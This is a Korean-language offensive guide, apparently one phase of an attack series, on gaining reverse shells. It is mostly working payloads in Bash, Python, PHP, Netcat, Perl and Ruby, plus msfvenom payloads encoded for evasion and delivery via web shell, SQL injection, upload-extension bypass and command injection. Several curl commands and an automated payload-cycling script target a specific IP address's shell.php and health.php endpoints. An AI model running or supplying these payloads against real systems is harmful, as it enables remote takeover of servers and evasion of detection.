# Phase 4: 리버스 쉘 (Reverse Shell) 기법

## 개요
리버스 쉘은 대상 서버에서 공격자의 머신으로 연결을 시작하여 대화형 쉘 접근을 획득하는 기법입니다. 방화벽이 인바운드 연결을 차단하더라도 아웃바운드 연결은 허용되는 경우가 많아 매우 효과적입니다.

## 필수 도구
- Netcat (nc)
- Metasploit Framework (msfvenom, msfconsole)
- Python
- PHP
- Bash
- Socat
- PowerShell (Windows 대상)

---

## 1. 리스너 설정

### 1.1 Netcat 리스너
```bash
# 기본 Netcat 리스너
nc -lvnp 4444

# 여러 연결 허용 (persistent listener)
while true; do nc -lvnp 4444; done

# OpenBSD netcat (일부 시스템)
nc -l -p 4444

# Ncat (Nmap 버전) - 더 안정적
ncat -lvnp 4444 --ssl  # SSL 암호화 지원
```

### 1.2 Metasploit 리스너
```bash
# Metasploit console 시작
msfconsole

# Multi handler 설정
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0  # 또는 특정 IP
set LPORT 4444
exploit -j  # 백그라운드로 실행

# Staged payload용
set payload linux/x64/shell/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
exploit

# Meterpreter session
set payload linux/x64/meterpreter/reverse_tcp
exploit
```

### 1.3 Socat 리스너 (고급)
```bash
# 기본 리스너
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# SSL 암호화 리스너
# 먼저 인증서 생성
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# SSL 리스너 시작
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork -
```

---

## 2. 리버스 쉘 페이로드

### 2.1 Bash 리버스 쉘
```bash
# 기본 Bash 리버스 쉘
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# URL 인코딩 버전 (웹 쉘용)
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%27

# Base64 인코딩 (WAF 우회)
echo "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" | base64
# 결과: YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQLzQ0NDQgMD4mMQo=
echo YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQLzQ0NDQgMD4mMQo= | base64 -d | bash

# Exec을 사용한 버전
exec 5<>/dev/tcp/YOUR_IP/4444;cat <&5 | while read line; do $line 2>&5 >&5; done

# /dev/tcp 사용 불가시 대안
mknod backpipe p; nc YOUR_IP 4444 0<backpipe | /bin/bash 1>backpipe
```

### 2.2 Python 리버스 쉘
```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# 더 안정적인 Python 리버스 쉘 스크립트
cat << 'EOF' > reverse_shell.py
#!/usr/bin/env python3
import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    import pty
    pty.spawn("/bin/bash")

if __name__ == "__main__":
    reverse_shell("YOUR_IP", 4444)
EOF

python3 reverse_shell.py
```

### 2.3 PHP 리버스 쉘
```php
# 간단한 PHP 리버스 쉘
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"); ?>

# Pentestmonkey PHP 리버스 쉘 (가장 안정적)
<?php
set_time_limit(0);
$ip = 'YOUR_IP';
$port = 4444;
$chunk_size = 1400;
$sock = fsockopen($ip, $port);
if (!$sock) {
    die();
}
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
if (!is_resource($process)) {
    die();
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (1) {
    if (feof($sock) || feof($pipes[1])) {
        break;
    }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>

# 웹쉘을 통한 실행
curl "http://3.35.218.180/uploads/shell.php?cmd=php%20-r%20'%24sock%3Dfsockopen%28%22YOUR_IP%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B'"
```

### 2.4 Netcat 리버스 쉘
```bash
# 기본 Netcat 리버스 쉘
nc YOUR_IP 4444 -e /bin/bash

# -e 옵션 없는 경우
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f

# OpenBSD netcat
nc YOUR_IP 4444 | /bin/sh | nc YOUR_IP 4445

# Ncat (SSL 지원)
ncat --ssl YOUR_IP 4444 -e /bin/bash
```

### 2.5 Perl 리버스 쉘
```bash
# Perl 한 줄 리버스 쉘
perl -e 'use Socket;$i="YOUR_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows용
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"YOUR_IP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### 2.6 Ruby 리버스 쉘
```bash
ruby -rsocket -e'f=TCPSocket.open("YOUR_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Windows용
ruby -rsocket -e 'c=TCPSocket.new("YOUR_IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## 3. Msfvenom 페이로드 생성

### 3.1 Linux 페이로드
```bash
# ELF 바이너리 (실행 파일)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
./shell.elf

# Staged payload (더 작은 크기)
msfvenom -p linux/x64/shell/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell_staged.elf

# Meterpreter (고급 기능)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o meterpreter.elf

# Python 스크립트
msfvenom -p python/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o shell.py

# Bash 스크립트
msfvenom -p cmd/unix/reverse_bash LHOST=YOUR_IP LPORT=4444 -f raw -o shell.sh
```

### 3.2 PHP 페이로드
```bash
# PHP 파일
msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw -o shell.php

# 난독화된 PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o meterpreter.php -e php/base64

# 웹쉘에 삽입할 수 있는 한 줄 PHP
msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw | tail -n +2
```

### 3.3 인코딩 및 난독화
```bash
# x86/shikata_ga_nai 인코더 (가장 인기)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -e x86/shikata_ga_nai -i 5 -o encoded_shell.elf

# 여러 번 인코딩
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -e x86/shikata_ga_nai -i 10 -o highly_encoded.elf

# 모든 인코더 확인
msfvenom --list encoders

# NULL 바이트 제거
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f c -b '\x00'
```

---

## 4. 쉘 안정화 (Shell Stabilization)

### 4.1 TTY 쉘로 업그레이드
```bash
# Python PTY 모듈 사용 (가장 권장)
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 그 다음 Ctrl+Z로 백그라운드 전환
# 공격자 머신에서:
stty raw -echo; fg
# 엔터 두 번

# 터미널 환경 설정
export TERM=xterm-256color
export SHELL=/bin/bash

# Script 명령어 사용
/usr/bin/script -qc /bin/bash /dev/null

# Expect 사용
expect -c 'spawn /bin/bash; interact'

# Socat 사용 (대상에 socat이 있는 경우)
# 공격자 머신:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# 대상 서버:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:4444
```

### 4.2 완전한 대화형 쉘
```bash
# 1단계: Python PTY 생성
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2단계: Ctrl+Z로 백그라운드

# 3단계: 터미널 raw 모드 설정
stty raw -echo; fg

# 4단계: 쉘 리셋
reset

# 5단계: 환경 변수 설정
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116  # 자신의 터미널 크기에 맞게 조정

# 터미널 크기 확인 (공격자 머신)
stty -a | grep -oP '(?<=rows )\d+|(?<=columns )\d+'
```

### 4.3 Readline 기능 활성화
```bash
# .inputrc 생성 (화살표 키, 자동완성 등)
cat > ~/.inputrc << 'EOF'
"\e[A": history-search-backward
"\e[B": history-search-forward
set show-all-if-ambiguous on
set completion-ignore-case on
EOF

# rlwrap 사용 (Netcat에 readline 기능 추가)
rlwrap nc -lvnp 4444
```

---

## 5. 특수 환경별 리버스 쉘

### 5.1 웹쉘을 통한 리버스 쉘
```bash
# 이미 웹쉘 접근이 있는 경우
curl "http://3.35.218.180/uploads/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%27"

# Python이 있는 경우
curl "http://3.35.218.180/uploads/shell.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;pty.spawn(\"/bin/bash\")%27"

# Netcat이 있는 경우
curl "http://3.35.218.180/uploads/shell.php?cmd=nc%20YOUR_IP%204444%20-e%20/bin/bash"
```

### 5.2 SQL Injection을 통한 리버스 쉘
```bash
# MySQL INTO OUTFILE로 웹쉘 작성 후 리버스 쉘 실행
' UNION SELECT "<?php system('bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"'); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -

# MySQL UDF (User Defined Function) 통해 직접 실행
' UNION SELECT sys_exec('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"')-- -
```

### 5.3 파일 업로드를 통한 리버스 쉘
```bash
# PHP 리버스 쉘 업로드
msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o shell.php

# 확장자 우회 기법
mv shell.php shell.php.jpg        # Double extension
mv shell.php shell.php5            # Alternative PHP extension
mv shell.php shell.phtml           # Alternative extension
mv shell.php shell.jpg             # Content-Type 조작과 함께

# 업로드 후 접근
curl http://3.35.218.180/uploads/shell.php
```

### 5.4 RCE를 통한 리버스 쉘
```bash
# health.php API의 cmd 파라미터 이용
curl "http://3.35.218.180/api/health.php?check=custom&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%27"

# Base64 인코딩으로 특수문자 우회
PAYLOAD=$(echo "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" | base64)
curl "http://3.35.218.180/api/health.php?check=custom&cmd=echo%20$PAYLOAD%20|%20base64%20-d%20|%20bash"
```

---

## 6. 리버스 쉘 디버깅

### 6.1 연결 실패 문제 해결
```bash
# 1. 방화벽 확인 (공격자 머신)
sudo iptables -L -n -v
sudo ufw status

# 2. 포트가 열려있는지 확인
sudo netstat -tlnp | grep 4444
sudo ss -tlnp | grep 4444

# 3. 리스너가 모든 인터페이스에서 대기 중인지 확인
nc -lvnp 4444  # 0.0.0.0:4444
nc -lv -s YOUR_IP -p 4444  # 특정 IP:4444

# 4. 대상 서버에서 아웃바운드 연결 테스트
curl http://YOUR_IP:4444
nc -zv YOUR_IP 4444

# 5. tcpdump로 트래픽 확인
sudo tcpdump -i any -n port 4444
```

### 6.2 쉘 즉시 종료 문제
```bash
# 원인: stdin/stdout이 제대로 리다이렉트되지 않음
# 해결책 1: Python PTY 사용
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 해결책 2: Script 명령 사용
script /dev/null -c /bin/bash

# 해결책 3: Socat 사용
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:4444
```

### 6.3 명령어 작동 안 함
```bash
# PATH 환경변수 설정
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# 절대 경로 사용
/usr/bin/id
/bin/cat /etc/passwd

# Which로 명령어 위치 찾기
which python3
which nc
```

---

## 7. 자동화 스크립트

### 7.1 여러 페이로드 시도 스크립트
```bash
#!/bin/bash
# auto_reverse_shell.sh - 여러 리버스 쉘 페이로드 자동 시도

TARGET="http://3.35.218.180/uploads/shell.php"
LHOST="YOUR_IP"
LPORT="4444"

echo "[*] Starting automated reverse shell attempts..."
echo "[*] Listener should be running on $LHOST:$LPORT"

# 페이로드 배열
PAYLOADS=(
    "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"
    "nc $LHOST $LPORT -e /bin/bash"
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
    "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
)

for payload in "${PAYLOADS[@]}"; do
    echo "[*] Trying: $payload"
    ENCODED=$(echo -n "$payload" | jq -sRr @uri)
    curl -s "${TARGET}?cmd=${ENCODED}" &
    sleep 2

    # 연결 확인
    if nc -zv $LHOST $LPORT 2>/dev/null; then
        echo "[+] Connection established!"
        exit 0
    fi
done

echo "[-] All payloads failed"
```

### 7.2 리버스 쉘 핸들러 스크립트
```bash
#!/bin/bash
# reverse_handler.sh - 자동 쉘 안정화 핸들러

PORT=${1:-4444}

echo "[*] Starting reverse shell handler on port $PORT"
echo "[*] Waiting for connection..."

# Netcat 리스너 시작
nc -lvnp $PORT

# 연결 수신 후 자동으로 실행될 명령어들 (별도 터미널에서 수동 실행 필요)
# python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
# stty raw -echo; fg
# export TERM=xterm-256color
# stty rows 38 columns 116
```

---

## 8. 고급 기법

### 8.1 암호화된 리버스 쉘
```bash
# SSL/TLS 암호화된 리버스 쉘
# 공격자 머신:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# 대상 서버:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect YOUR_IP:4444 > /tmp/s; rm /tmp/s
```

### 8.2 DNS 터널링을 통한 리버스 쉘
```bash
# dnscat2 사용
# 공격자 머신:
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
ruby dnscat2.rb your-domain.com

# 대상 서버:
./dnscat your-domain.com
```

### 8.3 멀티플렉싱 리버스 쉘
```bash
# Tmux를 사용하여 여러 세션 관리
tmux new -s shells
tmux split-window -h
tmux select-pane -t 0
nc -lvnp 4444
# Ctrl+B % 로 창 분할하여 여러 리스너 동시 운영
```

---

## 핵심 정리

1. 리스너 먼저 시작 - 페이로드 실행 전에 반드시 리스너가 대기 중이어야 함
2. 방화벽 확인 - 공격자 머신의 인바운드 연결 허용 필요
3. 쉘 안정화 필수 - Python PTY로 완전한 대화형 쉘 획득
4. 여러 페이로드 준비 - 환경에 따라 작동하는 페이로드가 다름
5. 암호화 고려 - 탐지 회피를 위해 SSL/TLS 암호화 사용

## 다음 단계
Phase 5: 권한 상승 (Privilege Escalation)으로 진행하여 root 권한 획득
